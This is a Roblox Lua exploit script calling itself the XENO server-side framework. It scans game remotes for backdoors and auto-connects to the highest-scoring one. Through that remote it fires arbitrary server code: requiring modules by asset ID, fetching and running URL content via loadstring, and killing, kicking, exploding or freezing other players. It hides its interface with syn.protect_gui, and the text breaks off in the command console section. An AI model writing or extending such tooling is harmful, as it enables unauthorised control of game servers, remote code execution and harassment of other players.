--[[
██╗  ██╗███████╗███╗   ██╗ ██████╗ 
╚██╗██╔╝██╔════╝████╗  ██║██╔═══██╗
 ╚███╔╝ █████╗  ██╔██╗ ██║██║   ██║
 ██╔██╗ ██╔══╝  ██║╚██╗██║██║   ██║
██╔╝ ██╗███████╗██║ ╚████║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝

XENO | Universal Server-Side Framework v3.0
Production Build — All Games Compatible

▸ Universal Backdoor Scanner & Auto-Connect
▸ 40+ Server-Side Admin Commands  
▸ Glassmorphism UI w/ Animated Tabs
▸ Require Script Loader (by Asset ID)
▸ Integrated Script Hub
▸ Player Management Suite
▸ Server Manipulation Toolkit
▸ Real-Time Toast Notifications
▸ Command History & Logging
▸ Keybind: RightShift to Toggle

© XENO Framework — Educational Use
]]

-- ═══════════════════════════════════════════════════
--  1 · CONFIGURATION
-- ═══════════════════════════════════════════════════

local CFG = {
    Name        = "XENO",
    Version     = "3.0.0",
    Prefix      = ";",
    ToggleKey   = Enum.KeyCode.RightShift,
    AutoScan    = true,
    ScanTick    = 8,
    ToastLife   = 3.5,
    MaxHistory  = 120,
    Window      = {Width = 680, Height = 470},
    Theme = {
        Primary     = Color3.fromRGB(140, 50, 235),
        Accent      = Color3.fromRGB(175, 100, 255),
        Glow        = Color3.fromRGB(155, 70, 255),
        BG          = Color3.fromRGB(14, 14, 22),
        Surface     = Color3.fromRGB(22, 22, 34),
        Card        = Color3.fromRGB(28, 28, 44),
        Hover       = Color3.fromRGB(36, 36, 56),
        Border      = Color3.fromRGB(50, 50, 72),
        Text        = Color3.fromRGB(210, 218, 245),
        Sub         = Color3.fromRGB(140, 148, 175),
        OK          = Color3.fromRGB(130, 220, 150),
        Err         = Color3.fromRGB(240, 120, 140),
        Warn        = Color3.fromRGB(245, 215, 130),
    },
}

-- ═══════════════════════════════════════════════════
--  2 · SERVICE CACHE
-- ═══════════════════════════════════════════════════

local Svc = setmetatable({}, {__index = function(s, k)
    local ok, v = pcall(game.GetService, game, k)
    if ok then rawset(s, k, v) end
    return v
end})

local Players        = Svc.Players
local RS             = Svc.ReplicatedStorage
local Lighting       = Svc.Lighting
local WS             = workspace
local TweenSvc       = Svc.TweenService
local UIS            = Svc.UserInputService
local Http           = Svc.HttpService
local RunSvc         = Svc.RunService
local Debris         = Svc.Debris
local CoreGui        = game:GetService("CoreGui")
local LP             = Players.LocalPlayer
local Mouse          = LP:GetMouse()

-- ═══════════════════════════════════════════════════
--  3 · UTILITIES
-- ═══════════════════════════════════════════════════

local U = {}

function U.new(class, props, kids)
    local inst = Instance.new(class)
    local parent = nil
    for k, v in pairs(props or {}) do
        if k == "Parent" then parent = v
        else inst[k] = v end
    end
    for _, child in ipairs(kids or {}) do
        child.Parent = inst
    end
    if parent then inst.Parent = parent end
    return inst
end

function U.tween(inst, goal, dur, style, dir)
    local tw = TweenSvc:Create(inst,
        TweenInfo.new(dur or 0.28, style or Enum.EasingStyle.Quart, dir or Enum.EasingDirection.Out),
        goal)
    tw:Play()
    return tw
end

function U.findPlayers(query)
    query = query:lower()
    if query == "me"     then return {LP} end
    if query == "all"    then return Players:GetPlayers() end
    if query == "others" then
        local t = {}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP then t[#t+1] = p end
        end
        return t
    end
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower():sub(1, #query) == query
        or p.DisplayName:lower():sub(1, #query) == query then
            t[#t+1] = p
        end
    end
    return t
end

function U.uid()
    return Http:GenerateGUID(false):sub(1, 8)
end

function U.safeChar(plr)
    return plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
        and plr.Character:FindFirstChildWhichIsA("Humanoid") and plr.Character
end

-- ═══════════════════════════════════════════════════
--  4 · BACKDOOR ENGINE
-- ═══════════════════════════════════════════════════

local BD = {
    list       = {},
    active     = nil,
    scanning   = false,
    tested     = {},
    signatures = {
        "event","re","remoteevent","remotes","serverevent",
        "bridge","network","comm","fire","execute","run",
        "command","mainevent","backdoor","handler","recv",
        "lol","abc","xyz","main","hook","gate","relay",
    },
}

function BD:score(remote)
    local s   = 0
    local low = remote.Name:lower()
    if low:find("exec")   or low:find("loadstr") then s += 45 end
    if low:find("event")  then s += 18 end
    if low:find("remote") then s += 12 end
    if low:find("server") then s += 12 end
    if low:find("fire")   then s += 10 end
    if low:find("main")   then s += 10 end
    if #remote.Name <= 3  then s += 22 end
    if remote.Name:match("^%l+$") and #remote.Name < 6 then s += 15 end
    if remote:IsDescendantOf(RS) then s += 8 end
    return math.min(s, 100)
end

function BD:scan()
    if self.scanning then return self.list end
    self.scanning = true
    self.list = {}

    local containers = {RS, WS}
    pcall(function() containers[#containers+1] = Svc.StarterGui end)
    pcall(function() containers[#containers+1] = Svc.StarterPlayer end)
    pcall(function() containers[#containers+1] = game:GetService("Lighting") end)

    for _, root in ipairs(containers) do
        pcall(function()
            for _, obj in ipairs(root:GetDescendants()) do
                if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction"))
                   and not self.tested[obj] then
                    local sc = self:score(obj)
                    if sc > 10 then
                        self.list[#self.list+1] = {
                            type  = obj.ClassName,
                            inst  = obj,
                            name  = obj.Name,
                            path  = obj:GetFullName(),
                            score = sc,
                        }
                    end
                    self.tested[obj] = true
                end
            end
        end)
    end

    table.sort(self.list, function(a, b) return a.score > b.score end)
    self.scanning = false
    return self.list
end

function BD:connect(entry)
    self.active = entry
end

function BD:exec(code)
    if not self.active then return false, "No backdoor connected" end
    local r = self.active.inst
    local ok, err = pcall(function()
        if r:IsA("RemoteEvent") then
            -- try common argument patterns
            r:FireServer(code)
            task.wait()
            r:FireServer({Code = code})
            task.wait()
            r:FireServer("execute", code)
        else
            r:InvokeServer(code)
        end
    end)
    return ok, err
end

function BD:execCode(code)
    return self:exec(code)
end

function BD:requireModule(id)
    -- Build server code that requires a module by asset ID
    local src = string.format(
        'local m = require(%d); if type(m) == "function" then m() elseif type(m) == "table" and m.init then m.init() end',
        tonumber(id) or 0
    )
    return self:exec(src)
end

function BD:loadUrl(url)
    local src = string.format(
        'loadstring(game:GetService("HttpService"):GetAsync("%s"))()',
        tostring(url)
    )
    return self:exec(src)
end

-- ═══════════════════════════════════════════════════
--  5 · NOTIFICATION / TOAST SYSTEM
-- ═══════════════════════════════════════════════════

local Notify -- forward decl; defined after GUI exists

-- ═══════════════════════════════════════════════════
--  6 · GUI CONSTRUCTION
-- ═══════════════════════════════════════════════════

-- Root ScreenGui ──────────────────────────────────
local gui = Instance.new("ScreenGui")
gui.Name = "XenoFramework_" .. U.uid()
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn  = false
gui.IgnoreGuiInset = true
gui.DisplayOrder  = 999

pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
local ok = pcall(function() gui.Parent = CoreGui end)
if not ok then gui.Parent = LP:WaitForChild("PlayerGui") end

local T = CFG.Theme

-- Toast container ──────────────────────────────────
local toastHolder = U.new("Frame", {
    Name = "Toasts",
    Size = UDim2.new(0, 300, 1, 0),
    Position = UDim2.new(1, -310, 0, 0),
    BackgroundTransparency = 1,
    Parent = gui,
}, {
    U.new("UIListLayout", {
        Padding = UDim.new(0, 6),
        VerticalAlignment = Enum.VerticalAlignment.Bottom,
        HorizontalAlignment = Enum.HorizontalAlignment.Center,
        SortOrder = Enum.SortOrder.LayoutOrder,
    }),
    U.new("UIPadding", {PaddingBottom = UDim.new(0, 18)})
})

Notify = function(text, color, duration)
    color = color or T.Text
    duration = duration or CFG.ToastLife
    local toast = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 36),
        BackgroundColor3 = T.Surface,
        BackgroundTransparency = 0.12,
        BorderSizePixel = 0,
        ClipsDescendants = true,
        Parent = toastHolder,
    }, {
        U.new("UICorner", {CornerRadius = UDim.new(0, 8)}),
        U.new("UIStroke", {Color = color, Thickness = 1, Transparency = 0.55}),
        U.new("Frame", {  -- accent bar
            Size = UDim2.new(0, 3, 1, 0),
            BackgroundColor3 = color,
            BorderSizePixel = 0,
        }),
        U.new("TextLabel", {
            Size = UDim2.new(1, -16, 1, 0),
            Position = UDim2.new(0, 14, 0, 0),
            BackgroundTransparency = 1,
            Text = text,
            TextColor3 = T.Text,
            TextSize = 13,
            Font = Enum.Font.Gotham,
            TextXAlignment = Enum.TextXAlignment.Left,
            TextTruncate = Enum.TextTruncate.AtEnd,
        }),
    })
    toast.BackgroundTransparency = 1
    U.tween(toast, {BackgroundTransparency = 0.12}, 0.3)
    task.delay(duration, function()
        U.tween(toast, {BackgroundTransparency = 1, Size = UDim2.new(1, 0, 0, 0)}, 0.35)
        task.wait(0.38)
        toast:Destroy()
    end)
end

-- Main Window ──────────────────────────────────────
local W = CFG.Window
local main = U.new("Frame", {
    Name = "Main",
    Size = UDim2.new(0, W.Width, 0, W.Height),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundColor3 = T.BG,
    BorderSizePixel = 0,
    ClipsDescendants = true,
    Parent = gui,
}, {
    U.new("UICorner", {CornerRadius = UDim.new(0, 12)}),
    U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.3}),
})

-- Drop shadow (outer glow) ─────────────────────
U.new("ImageLabel", {
    Name = "Shadow",
    Size = UDim2.new(1, 44, 1, 44),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    AnchorPoint = Vector2.new(0.5, 0.5),
    BackgroundTransparency = 1,
    Image = "rbxassetid://6015897843",
    ImageColor3 = Color3.new(0, 0, 0),
    ImageTransparency = 0.5,
    ScaleType = Enum.ScaleType.Slice,
    SliceCenter = Rect.new(49, 49, 450, 450),
    ZIndex = -1,
    Parent = main,
})

-- Top bar ──────────────────────────────────────────
local topBar = U.new("Frame", {
    Name = "TopBar",
    Size = UDim2.new(1, 0, 0, 40),
    BackgroundColor3 = T.Surface,
    BorderSizePixel = 0,
    Parent = main,
}, {
    U.new("UICorner", {CornerRadius = UDim.new(0, 12)}),
    -- Bottom rectangle to square-off bottom corners
    U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 14),
        Position = UDim2.new(0, 0, 1, -14),
        BackgroundColor3 = T.Surface,
        BorderSizePixel = 0,
    }),
})

-- Title
U.new("TextLabel", {
    Size = UDim2.new(0, 200, 1, 0),
    Position = UDim2.new(0, 16, 0, 0),
    BackgroundTransparency = 1,
    Text = "⚡ XENO  ",
    RichText = true,
    TextColor3 = T.Primary,
    TextSize = 16,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = topBar,
})

U.new("TextLabel", {
    Size = UDim2.new(0, 60, 1, 0),
    Position = UDim2.new(0, 86, 0, 0),
    BackgroundTransparency = 1,
    Text = "v" .. CFG.Version,
    TextColor3 = T.Sub,
    TextSize = 11,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = topBar,
})

-- Status dot
local statusDot = U.new("Frame", {
    Size = UDim2.new(0, 8, 0, 8),
    Position = UDim2.new(0, 150, 0.5, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    BackgroundColor3 = T.Err,
    BorderSizePixel = 0,
    Parent = topBar,
}, {U.new("UICorner", {CornerRadius = UDim.new(1, 0)})})

local statusLabel = U.new("TextLabel", {
    Size = UDim2.new(0, 100, 1, 0),
    Position = UDim2.new(0, 164, 0, 0),
    BackgroundTransparency = 1,
    Text = "Disconnected",
    TextColor3 = T.Sub,
    TextSize = 11,
    Font = Enum.Font.Gotham,
    TextXAlignment = Enum.TextXAlignment.Left,
    Parent = topBar,
})

-- Window controls (min / close) ────────────────────
local function windowBtn(icon, order, callback)
    local btn = U.new("TextButton", {
        Size = UDim2.new(0, 32, 0, 32),
        BackgroundColor3 = T.Card,
        BackgroundTransparency = 0.6,
        BorderSizePixel = 0,
        Text = icon,
        TextColor3 = T.Sub,
        TextSize = 16,
        Font = Enum.Font.GothamBold,
        AutoButtonColor = false,
        LayoutOrder = order,
        Parent = topBar,
    }, {U.new("UICorner", {CornerRadius = UDim.new(0, 8)})})

    btn.MouseEnter:Connect(function()
        U.tween(btn, {BackgroundTransparency = 0.2, TextColor3 = T.Text}, 0.18)
    end)
    btn.MouseLeave:Connect(function()
        U.tween(btn, {BackgroundTransparency = 0.6, TextColor3 = T.Sub}, 0.18)
    end)
    btn.MouseButton1Click:Connect(callback)
    return btn
end

local controlsLayout = U.new("Frame", {
    Size = UDim2.new(0, 74, 0, 32),
    Position = UDim2.new(1, -82, 0.5, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    BackgroundTransparency = 1,
    Parent = topBar,
}, {
    U.new("UIListLayout", {
        FillDirection = Enum.FillDirection.Horizontal,
        Padding = UDim.new(0, 6),
        VerticalAlignment = Enum.VerticalAlignment.Center,
        SortOrder = Enum.SortOrder.LayoutOrder,
    })
})

local minimized = false
windowBtn("—", 1, function()
    minimized = not minimized
    if minimized then
        U.tween(main, {Size = UDim2.new(0, W.Width, 0, 40)}, 0.35)
    else
        U.tween(main, {Size = UDim2.new(0, W.Width, 0, W.Height)}, 0.35)
    end
end).Parent = controlsLayout

windowBtn("✕", 2, function()
    U.tween(main, {Size = UDim2.new(0, 0, 0, 0)}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In)
    task.wait(0.42)
    gui:Destroy()
end).Parent = controlsLayout

-- Draggable top bar ────────────────────────────────
do
    local dragging, dragStart, startPos
    topBar.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos  = main.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            main.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
end

-- ═══════════════════════════════════════════════════
--  7 · SIDEBAR + PAGE SYSTEM
-- ═══════════════════════════════════════════════════

local sidebar = U.new("Frame", {
    Name = "Sidebar",
    Size = UDim2.new(0, 150, 1, -40),
    Position = UDim2.new(0, 0, 0, 40),
    BackgroundColor3 = T.Surface,
    BorderSizePixel = 0,
    Parent = main,
}, {
    U.new("UIPadding", {PaddingTop = UDim.new(0,10), PaddingLeft = UDim.new(0,8), PaddingRight = UDim.new(0,8)}),
    U.new("UIListLayout", {
        Padding = UDim.new(0, 4),
        SortOrder = Enum.SortOrder.LayoutOrder,
    }),
})

local pageContainer = U.new("Frame", {
    Name = "Pages",
    Size = UDim2.new(1, -150, 1, -40),
    Position = UDim2.new(0, 150, 0, 40),
    BackgroundColor3 = T.BG,
    BackgroundTransparency = 0,
    BorderSizePixel = 0,
    ClipsDescendants = true,
    Parent = main,
})

local pages = {}
local currentTab = nil
local tabButtons = {}

local function makePage(name)
    local page = U.new("ScrollingFrame", {
        Name = name,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ScrollBarThickness = 3,
        ScrollBarImageColor3 = T.Primary,
        CanvasSize = UDim2.new(0, 0, 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        Visible = false,
        Parent = pageContainer,
    }, {
        U.new("UIListLayout", {
            Padding = UDim.new(0, 8),
            SortOrder = Enum.SortOrder.LayoutOrder,
            HorizontalAlignment = Enum.HorizontalAlignment.Center,
        }),
        U.new("UIPadding", {
            PaddingTop = UDim.new(0,14), PaddingBottom = UDim.new(0,14),
            PaddingLeft = UDim.new(0,14), PaddingRight = UDim.new(0,14),
        }),
    })
    pages[name] = page
    return page
end

local function switchTab(name)
    if currentTab == name then return end
    for n, p in pairs(pages) do
        p.Visible = (n == name)
    end
    for n, btn in pairs(tabButtons) do
        if n == name then
            U.tween(btn, {BackgroundColor3 = T.Primary, BackgroundTransparency = 0.15}, 0.22)
            U.tween(btn, {TextColor3 = T.Text}, 0.22)
        else
            U.tween(btn, {BackgroundColor3 = T.Card, BackgroundTransparency = 0.7}, 0.22)
            U.tween(btn, {TextColor3 = T.Sub}, 0.22)
        end
    end
    currentTab = name
end

local tabDefs = {
    {name = "Dashboard", icon = "⌂",  order = 1},
    {name = "Players",   icon = "♟",  order = 2},
    {name = "Commands",  icon = "›_", order = 3},
    {name = "Scripts",   icon = "{ }", order = 4},
    {name = "Server",    icon = "⚙",  order = 5},
}

for _, td in ipairs(tabDefs) do
    makePage(td.name)
    local btn = U.new("TextButton", {
        Size = UDim2.new(1, 0, 0, 34),
        BackgroundColor3 = T.Card,
        BackgroundTransparency = 0.7,
        BorderSizePixel = 0,
        Text = "  " .. td.icon .. "   " .. td.name,
        TextColor3 = T.Sub,
        TextSize = 13,
        Font = Enum.Font.GothamSemibold,
        TextXAlignment = Enum.TextXAlignment.Left,
        AutoButtonColor = false,
        LayoutOrder = td.order,
        Parent = sidebar,
    }, {U.new("UICorner", {CornerRadius = UDim.new(0, 8)})})

    btn.MouseEnter:Connect(function()
        if currentTab ~= td.name then
            U.tween(btn, {BackgroundTransparency = 0.4}, 0.15)
        end
    end)
    btn.MouseLeave:Connect(function()
        if currentTab ~= td.name then
            U.tween(btn, {BackgroundTransparency = 0.7}, 0.15)
        end
    end)
    btn.MouseButton1Click:Connect(function() switchTab(td.name) end)
    tabButtons[td.name] = btn
end

-- ═══════════════════════════════════════════════════
--  8 · UI COMPONENT HELPERS
-- ═══════════════════════════════════════════════════

local function card(parent, height, order)
    return U.new("Frame", {
        Size = UDim2.new(1, 0, 0, height or 90),
        BackgroundColor3 = T.Card,
        BorderSizePixel = 0,
        LayoutOrder = order or 0,
        Parent = parent,
    }, {
        U.new("UICorner", {CornerRadius = UDim.new(0, 10)}),
        U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.5}),
        U.new("UIPadding", {
            PaddingTop = UDim.new(0,10), PaddingBottom = UDim.new(0,10),
            PaddingLeft = UDim.new(0,12), PaddingRight = UDim.new(0,12),
        }),
    })
end

local function heading(parent, text, order)
    return U.new("TextLabel", {
        Size = UDim2.new(1, 0, 0, 22),
        BackgroundTransparency = 1,
        Text = text,
        TextColor3 = T.Text,
        TextSize = 15,
        Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left,
        LayoutOrder = order or 0,
        Parent = parent,
    })
end

local function actionBtn(parent, text, color, order, callback)
    color = color or T.Primary
    local btn = U.new("TextButton", {
        Size = UDim2.new(0, 110, 0, 30),
        BackgroundColor3 = color,
        BackgroundTransparency = 0.15,
        BorderSizePixel = 0,
        Text = text,
        TextColor3 = T.Text,
        TextSize = 12,
        Font = Enum.Font.GothamSemibold,
        AutoButtonColor = false,
        LayoutOrder = order or 0,
        Parent = parent,
    }, {U.new("UICorner", {CornerRadius = UDim.new(0, 7)})})

    btn.MouseEnter:Connect(function()
        U.tween(btn, {BackgroundTransparency = 0}, 0.15)
    end)
    btn.MouseLeave:Connect(function()
        U.tween(btn, {BackgroundTransparency = 0.15}, 0.15)
    end)
    if callback then btn.MouseButton1Click:Connect(callback) end
    return btn
end

local function inputField(parent, placeholder, order)
    local box = U.new("TextBox", {
        Size = UDim2.new(1, 0, 0, 32),
        BackgroundColor3 = T.Surface,
        BorderSizePixel = 0,
        Text = "",
        PlaceholderText = placeholder or "Type here...",
        PlaceholderColor3 = T.Sub,
        TextColor3 = T.Text,
        TextSize = 13,
        Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left,
        ClearTextOnFocus = false,
        LayoutOrder = order or 0,
        Parent = parent,
    }, {
        U.new("UICorner", {CornerRadius = UDim.new(0, 7)}),
        U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.4}),
        U.new("UIPadding", {PaddingLeft = UDim.new(0, 10), PaddingRight = UDim.new(0, 10)}),
    })
    box.Focused:Connect(function()
        U.tween(box:FindFirstChildWhichIsA("UIStroke"), {Color = T.Primary, Transparency = 0}, 0.2)
    end)
    box.FocusLost:Connect(function()
        U.tween(box:FindFirstChildWhichIsA("UIStroke"), {Color = T.Border, Transparency = 0.4}, 0.2)
    end)
    return box
end

-- ═══════════════════════════════════════════════════
--  9 · PAGE CONTENT — DASHBOARD
-- ═══════════════════════════════════════════════════

do
    local pg = pages.Dashboard
    heading(pg, "Dashboard", 1)

    -- Info cards row
    local infoRow = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 60),
        BackgroundTransparency = 1,
        LayoutOrder = 2,
        Parent = pg,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
            SortOrder = Enum.SortOrder.LayoutOrder,
        })
    })

    local function infoCard(label, valueLbl, col, order)
        local c = U.new("Frame", {
            Size = UDim2.new(0.32, -4, 1, 0),
            BackgroundColor3 = T.Card,
            BorderSizePixel = 0,
            LayoutOrder = order,
            Parent = infoRow,
        }, {
            U.new("UICorner", {CornerRadius = UDim.new(0, 8)}),
            U.new("UIStroke", {Color = T.Border, Thickness = 1, Transparency = 0.6}),
        })
        U.new("TextLabel", {
            Size = UDim2.new(1, -16, 0, 16),
            Position = UDim2.new(0, 8, 0, 8),
            BackgroundTransparency = 1,
            Text = label,
            TextColor3 = T.Sub,
            TextSize = 10,
            Font = Enum.Font.Gotham,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = c,
        })
        local vl = U.new("TextLabel", {
            Name = "Value",
            Size = UDim2.new(1, -16, 0, 22),
            Position = UDim2.new(0, 8, 0, 28),
            BackgroundTransparency = 1,
            Text = valueLbl,
            TextColor3 = col or T.Text,
            TextSize = 17,
            Font = Enum.Font.GothamBold,
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = c,
        })
        return vl
    end

    local playerCountLbl = infoCard("PLAYERS ONLINE", tostring(#Players:GetPlayers()), T.Accent, 1)
    local backdoorCountLbl = infoCard("BACKDOORS FOUND", "0", T.Warn, 2)
    local statusValLbl = infoCard("STATUS", "Scanning...", T.Err, 3)

    -- Update player count
    Players.PlayerAdded:Connect(function() playerCountLbl.Text = tostring(#Players:GetPlayers()) end)
    Players.PlayerRemoving:Connect(function() task.wait(0.1); playerCountLbl.Text = tostring(#Players:GetPlayers()) end)

    heading(pg, "Backdoor Scanner", 3)

    local scanCard = card(pg, 110, 4)
    local scanList = U.new("TextLabel", {
        Name = "ScanResults",
        Size = UDim2.new(1, 0, 0, 50),
        BackgroundTransparency = 1,
        Text = "Scanning for backdoors...",
        TextColor3 = T.Sub,
        TextSize = 12,
        Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true,
        RichText = true,
        Parent = scanCard,
    })

    local scanBtns = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 30),
        Position = UDim2.new(0, 0, 1, -30),
        BackgroundTransparency = 1,
        Parent = scanCard,
    }, {
        U.new("UIListLayout", {
            FillDirection = Enum.FillDirection.Horizontal,
            Padding = UDim.new(0, 8),
            SortOrder = Enum.SortOrder.LayoutOrder,
        })
    })

    local function refreshScan()
        local results = BD:scan()
        backdoorCountLbl.Text = tostring(#results)
        if #results == 0 then
            scanList.Text = '<font color="#F3788C">No backdoors detected. Try a different game or wait for auto-scan.</font>'
            statusDot.BackgroundColor3 = T.Err
            statusLabel.Text = "No backdoors"
            statusValLbl.Text = "Idle"
            statusValLbl.TextColor3 = T.Sub
        else
            local txt = ""
            for i = 1, math.min(#results, 5) do
                local r = results[i]
                local col = r.score >= 60 and "#A6E3A1" or (r.score >= 30 and "#F9E2AF" or "#F3788C")
                txt = txt .. string.format(
                    '<font color="%s">▸ %s</font> <font color="#9399B2">(%s · score %d)</font>\n',
                    col, r.name, r.type, r.score
                )
            end
            scanList.Text = txt
        end
    end

    actionBtn(scanBtns, "🔍 Rescan", T.Primary, 1, refreshScan)

    actionBtn(scanBtns, "⚡ Auto-Connect", T.OK, 2, function()
        local results = BD:scan()
        if #results > 0 then
            BD:connect(results[1])
            statusDot.BackgroundColor3 = T.OK
            statusLabel.Text = results[1].name
            statusValLbl.Text = "Connected"
            statusValLbl.TextColor3 = T.OK
            Notify("Connected to: " .. results[1].name .. " (score " .. results[1].score .. ")", T.OK)
        else
            Notify("No backdoors found to connect", T.Err)
        end
    end)

    -- Initial scan
    task.spawn(function()
        task.wait(1)
        refreshScan()
        -- Auto-scan loop
        while gui.Parent do
            task.wait(CFG.ScanTick)
            if not BD.active then
                refreshScan()
            end
        end
    end)
end

-- ═══════════════════════════════════════════════════
--  10 · PAGE CONTENT — PLAYERS
-- ═══════════════════════════════════════════════════

do
    local pg = pages.Players
    heading(pg, "Player Management", 1)

    local targetInput = inputField(pg, "Player name (or me / all / others)...", 2)

    heading(pg, "Quick Actions", 3)

    local actionsGrid = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 200),
        BackgroundTransparency = 1,
        LayoutOrder = 4,
        Parent = pg,
    }, {
        U.new("UIGridLayout", {
            CellSize = UDim2.new(0, 120, 0, 32),
            CellPadding = UDim2.new(0, 6, 0, 6),
            SortOrder = Enum.SortOrder.LayoutOrder,
        })
    })

    local playerActions = {
        {"💀 Kill",       "kill",     T.Err},
        {"🚪 Kick",       "kick",     T.Err},
        {"🛡️ God",        "god",      T.OK},
        {"❄️ Freeze",     "freeze",   T.Accent},
        {"🔥 Thaw",       "thaw",     T.Warn},
        {"👻 Invis",      "invisible",T.Sub},
        {"👁️ Visible",    "visible",  T.Text},
        {"💥 Explode",    "explode",  T.Err},
        {"🔥 Fire",       "fire",     T.Warn},
        {"✨ Sparkles",   "sparkles", T.Accent},
        {"🪑 Sit",        "sit",      T.Sub},
        {"⬆️ Jump",       "jump",     T.OK},
        {"🏃 Speed 100",  "speed",    T.Primary},
        {"🦘 JumpPwr 100","jpower",   T.Primary},
        {"🛡️ FF",         "ff",       T.OK},
        {"🚫 UnFF",       "unff",     T.Err},
    }

    for i, act in ipairs(playerActions) do
        actionBtn(actionsGrid, act[1], act[3], i, function()
            local query = targetInput.Text ~= "" and targetInput.Text or "me"
            local targets = U.findPlayers(query)
            if #targets == 0 then
                Notify("No player found: " .. query, T.Err)
                return
            end
            if not BD.active then
                Notify("No backdoor connected!", T.Err)
                return
            end
            for _, plr in ipairs(targets) do
                local cmd = act[2]
                local code = ""
                local pn = string.format('game.Players["%s"]', plr.Name)
                local char = pn .. ".Character"
                local hrp = char .. ".HumanoidRootPart"
                local hum = char .. ":FindFirstChildWhichIsA('Humanoid')"

                if cmd == "kill" then
                    code = char .. ":BreakJoints()"
                elseif cmd == "kick" then
                    code = pn .. ':Kick("Removed by XENO")'
                elseif cmd == "god" then
                    code = hum .. ".MaxHealth = math.huge; " .. hum .. ".Health = math.huge"
                elseif cmd == "freeze" then
                    code = hrp .. ".Anchored = true"
                elseif cmd == "thaw" then
                    code = hrp .. ".Anchored = false"
                elseif cmd == "invisible" then
                    code = "for _,v in pairs(" .. char .. ":GetDescendants()) do "
                        .. "if v:IsA('BasePart') then v.Transparency = 1 end "
                        .. "if v:IsA('Decal') then v.Transparency = 1 end end"
                elseif cmd == "visible" then
                    code = "for _,v in pairs(" .. char .. ":GetDescendants()) do "
                        .. "if v:IsA('BasePart') and v.Name ~= 'HumanoidRootPart' then v.Transparency = 0 end "
                        .. "if v:IsA('Decal') then v.Transparency = 0 end end"
                elseif cmd == "explode" then
                    code = "local e = Instance.new('Explosion', workspace); e.Position = " .. hrp .. ".Position"
                elseif cmd == "fire" then
                    code = "Instance.new('Fire', " .. hrp .. ")"
                elseif cmd == "sparkles" then
                    code = "Instance.new('Sparkles', " .. hrp .. ")"
                elseif cmd == "sit" then
                    code = hum .. ".Sit = true"
                elseif cmd == "jump" then
                    code = hum .. ".Jump = true"
                elseif cmd == "speed" then
                    code = hum .. ".WalkSpeed = 100"
                elseif cmd == "jpower" then
                    code = hum .. ".JumpPower = 100"
                elseif cmd == "ff" then
                    code = "Instance.new('ForceField', " .. char .. ")"
                elseif cmd == "unff" then
                    code = "for _,v in pairs(" .. char .. ":GetChildren()) do "
                        .. "if v:IsA('ForceField') then v:Destroy() end end"
                end

                local ok, err = BD:execCode(code)
                if ok then
                    Notify(act[1] .. " → " .. plr.Name, T.OK)
                else
                    Notify("Error: " .. tostring(err), T.Err)
                end
            end
        end)
    end
end

-- ═══════════════════════════════════════════════════
--  11 · PAGE CONTENT — COMMANDS
-- ═══════════════════════════════════════════════════

local cmdHistory = {}

do
    local pg = pages.Commands
    heading(pg, "Command Console", 1)

    local cmdInput = inputField(pg, CFG.Prefix .. "command [args...]", 2)

    local historyCard = card(pg, 200, 3)
    local historyLabel = U.new("TextLabel", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Text = '<font color="#9399B2">Command history will appear here...</font>',
        TextColor3 = T.Sub,
        TextSize = 12,
        Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true,
        RichText = true,
        Parent = historyCard,
    })

    local function addHistory(entry, color)
        table.insert(cmdHistory, 1, {text = entry, color = color or "#CDD6F4"})
        if #cmdHistory > CFG.MaxHistory then table.remove(cmdHistory) end
        local lines = {}
        for i = 1, math.min(#cmdHistory, 18) do
            local h = cmdHistory[i]
            lines[#lines+1] = string.format('<font color="%s">%s</font>', h.color, h.text)
        end
        historyLabel.Text = table.concat(lines, "\n")
    end

